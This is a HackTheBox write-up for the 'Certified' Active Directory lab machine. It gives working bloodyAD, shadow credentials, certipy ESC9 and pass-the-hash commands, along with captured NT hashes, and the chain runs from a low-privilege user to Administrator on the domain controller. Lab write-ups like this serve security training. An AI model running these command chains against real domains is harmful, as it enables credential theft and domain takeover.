---
title: "Certified HackTheBox" 
date: 2025-07-21 23:50:00 0000+
tags: [WriteUp, Certified, HTB, Enumeration, Active Directory, Rusthound-CE, ADCS, RID Bruteforcing, Lateral Movement, Bloodhound, ESC9, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Certified_HTB/preview_certified.png
---
# Certified HTB Writeup

Certified is a medium level box on HackTheBox which is based on assumed breach scenario we have valid credentials which we can use to enumerate the users in the domain whether via **RID cycling** or through **LDAP**, after feeding the ingested data to bloodhound helps identify the correct attack path to get a user which has **ESC9**, **ESC9** helped us to get to the Administrator and retrieve the root flag.

![image.png](/assets/images/Certified_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services on the box.

```bash
rustmap.py -ip 10.129.231.186
```

Scan gives us the following results.

![image.png](/assets/images/Certified_HTB/image%201.png)

![image.png](/assets/images/Certified_HTB/image%202.png)

![image.png](/assets/images/Certified_HTB/image%203.png)

We observed that a certificate authority is running on the DC and also the SMB ports are open.

### SMB Enumeration

Credentials → **judith.mader:judith09**

As we have valid credentials lets just enumerate shares with them using NetExec.

```bash
nxc smb certified.htb -u 'judith.mader' -p 'judith09' --shares
```

![image.png](/assets/images/Certified_HTB/image%204.png)

No interesting share found within SMB.

Now lets just enumerate all the users using the RID Cycling attack.

```bash
nxc smb certified.htb -u 'judith.mader' -p 'judith09' --rid-brute
```

![image.png](/assets/images/Certified_HTB/image%205.png)

Saved this to the usernames.txt file.

### Bloodhound

Used rusthound-ce as the collector to collect data from the domain.

```bash
rusthound-ce -d certified.htb -u 'judith.mader' -p 'judith09' -f dc01.certified.htb -z
```

![image.png](/assets/images/Certified_HTB/image%206.png)

Now uploading this created zip to our BloodhoundCE.

Marking our judith.mader user as owned.

I had formed the following bloodhound path.

![image.png](/assets/images/Certified_HTB/image%207.png)

## Lateral Movement in Domain

Using bloodyAD to do the lateral movement from **Judith.mader** to **Ca_operator**.

[https://github.com/CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

### Judith.mader@certified.htb → Management@certified.htb

![image.png](/assets/images/Certified_HTB/image%208.png)

We can see that **Judith.mader** has **WriteOwner** permissions on **Management@certified.htb** group.

So lets just set **Judith** as the owner of **management** group.

```bash
bloodyAD -d certified.htb -u 'judith.mader' -p 'judith09' --dc-ip 10.129.231.186 set owner 'Management' 'judith.mader'
```

![image.png](/assets/images/Certified_HTB/image%209.png)

Now lets give **judith.mader** **genericAll** on **management.**

```bash
bloodyAD -d certified.htb -u 'judith.mader' -p 'judith09' --dc-ip 10.129.231.186 add genericAll management judith.mader
```

![image.png](/assets/images/Certified_HTB/image%2010.png)

Now we add **judith.mader** to the **management** group.

```bash
bloodyAD -d certified.htb -u 'judith.mader' -p 'judith09' --dc-ip 10.129.231.186 add groupMember management judith.mader
```

![image.png](/assets/images/Certified_HTB/image%2011.png)

To see that we have successfully added into the **management** group.

```bash
net rpc group members "Management" -U "certified.htb"/"judith.mader"%"judith09" -S "DC01"
```

![image.png](/assets/images/Certified_HTB/image%2012.png)

Confirming that we successfully added **judith.mader** to the **management** group.

Now marking **Management** as owned.

### Management@certified.htb → Management_svc@certified.htb

![image.png](/assets/images/Certified_HTB/image%2013.png)

Now from **management** group we have **GenericWrite** on **Management_svc** user.

Exploiting that privilege with bloodyAD, we are using **ShadowCredentials** attack vector to get the TGT or NT hash of the **management_svc** user account.

```bash
bloodyAD -d certified.htb -u 'judith.mader' -p 'judith09' --dc-ip 10.129.231.186 add shadowCredentials 'management_svc'
```

![image.png](/assets/images/Certified_HTB/image%2014.png)

### Management_svc@certified.htb → ca_operator@certified.htb

![image.png](/assets/images/Certified_HTB/image%2015.png)

After owning **management_svc**, we see that it has **GenericAll** on **ca_operator**.

Exploiting this using bloodyAD.

Since we have the TGT for **management_svc** user stored in the .ccache file.

```bash
export KRB5CCNAME=management_svc_Wj.ccache
```

exported the ccache file to our kerberos environment variable and used klist to showcase it.

![image.png](/assets/images/Certified_HTB/image%2016.png)

I was experiencing problems with the TGT the kerberos way of using bloodyAD.

So proceeding with the normal usage of bloodyAD.

```bash
bloodyAD -d certified.htb -u 'management_svc' -p :a091c1832bcdd4677c28b5a6a1295584 --dc-ip 10.129.231.186 add shadowCredentials 'ca_operator'
```

![image.png](/assets/images/Certified_HTB/image%2017.png)

Now we have the NT hash of the **ca_operator@certified.htb** account and its TGT.

### Shell as Management_svc

Now lets try to authenticate as **ca_operator** on **certified.htb**.

```bash
nxc winrm certified.htb -u ca_operator -H b4b86f45c6018f1b664f70805f45d8f2
```

![image.png](/assets/images/Certified_HTB/image%2018.png)

Unfortunately we cant do this so lets try with our **management_svc** user.

```bash
nxc winrm certified.htb -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

![image.png](/assets/images/Certified_HTB/image%2019.png)

And yes it says pwned, using evil-winrm to get a shell as **management_svc**.

```bash
evil-winrm -i 10.129.231.186 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584
```

![image.png](/assets/images/Certified_HTB/image%2020.png)

Grabbing that user.txt and submitting it.

## Privilege Escalation

As the name of the box suggests **“CERTIFIED”** , I thought **Cerificate service** is running on the box and I was correct.

### ESC9

Running certipy to find the CA and the vulnerable templates.

```bash
certipy find -u 'ca_operator' -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -dc-ip '10.129.231.186' -vulnerable -text -enabled
```

![image.png](/assets/images/Certified_HTB/image%2021.png)

Looking at the results we have this data.

```text
Certificate Authorities
  0
    CA Name                             : certified-DC01-CA
    DNS Name                            : DC01.certified.htb
    Certificate Subject                 : CN=certified-DC01-CA, DC=certified, DC=htb
    Certificate Serial Number           : 36472F2C180FBB9B4983AD4D60CD5A9D
    Certificate Validity Start          : 2024-05-13 15:33:41+00:00
    Certificate Validity End            : 2124-05-13 15:43:41+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFIED.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        ManageCertificates              : CERTIFIED.HTB\Administrators
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Enroll                          : CERTIFIED.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CertifiedAuthentication
    Display Name                        : Certified Authentication
    Certificate Authorities             : certified-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : PublishToDs
                                          AutoEnrollment
                                          NoSecurityExtension
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-05-13T15:48:52+00:00
    Template Last Modified              : 2024-05-13T15:55:20+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFIED.HTB\operator ca
                                          CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFIED.HTB\Administrator
        Full Control Principals         : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFIED.HTB\Domain Admins
                                          CERTIFIED.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFIED.HTB\operator ca
    [!] Vulnerabilities
      ESC9                              : Template has no security extension.
    [*] Remarks
      ESC9                              : Other prerequisites may be required for this to be exploitable. See the wiki for more details.

```

**We can see that in the EnrollmentFlag section the NoSecurityExtension is present which enables us to do a ESC9.**

In the last line of output it is mentioned that it is vulnerable to ESC9.

**Also for ESC9 to work we need enrollment permissions on ca_operator, to enroll a certificate.**

**The “Require Manager Approval” and “Authorized Signatures Required” flags also set to False and 0 which in our case is present.**

Hence we can do **ESC9.**

Looking at the bloodhound data , as ca_operator we can Enroll certificates.

![image.png](/assets/images/Certified_HTB/image%2022.png)

So lets exploit this and escalate to **Administrator.**

**We need to have an account with GenericAll privileges on it.**

![image.png](/assets/images/Certified_HTB/image%2023.png)

**In our case it is Management_svc has GenericAll on CA_Operator.**

In the end we must have the NT hash of the targeted account which in our case is **CA_Operator.**

We have the NT hash of the **CA_operator** account.

**Now using the NT hash of the Management_svc account we modify CA_operator user’s UPN and set to Administrator@certified.htb**

```bash
certipy account update -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -user 'ca_operator' -upn 'administrator@certified.htb' -dc-ip 10.129.231.186
```

![image.png](/assets/images/Certified_HTB/image%2024.png)

After successfully modifying the UPN of the account **CA_operator**.

We now request a certificate with CA in our case it is **certified-DC01-CA** for the **Administrator@certified.htb**

```bash
certipy req -u 'ca_operator@certified.htb' -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca 'certified-DC01-CA' -template 'CertifiedAuthentication' -dc-ip 10.129.231.186
```

![image.png](/assets/images/Certified_HTB/image%2025.png)

Now lets just authenticate using this **.pfx** file.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.231.186
```

![image.png](/assets/images/Certified_HTB/image%2026.png)

Got the NT hash for the **administrator** account.

Now lets just revert back the changes.

```bash
certipy account update -u 'management_svc@certified.htb' -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn ca_operator@certified.htb -dc-ip 10.129.231.186
```

![image.png](/assets/images/Certified_HTB/image%2027.png)

**If we dont revert the changes back we will face authentication issues. If the UPN still says “Administrator@certified@htb” , the DC might map the cert to “CA_OPERATOR” which could trigger name mismatch errors or our most encountered error “KDC_ERR_C_PRINCIPAL_UNKNOWN” whenever requesting a TGT.**

Now lets verify that we have a correct **Administrator** hash using **NetExec**.

```bash
nxc ldap certified.htb -u 'Administrator' -H 0d5b49608bbce1751f708748f67e2d34
```

![image.png](/assets/images/Certified_HTB/image%2028.png)

Now lets Winrm into the box as an **administrator**.

```bash
evil-winrm -i 10.129.231.186 -u Administrator -H 0d5b49608bbce1751f708748f67e2d34
```

![image.png](/assets/images/Certified_HTB/image%2029.png)

Grabbing the **administrator** flag and submitting it.

Rooted!!

![image.png](/assets/images/Certified_HTB/image%2030.png)

Thanks for reading.
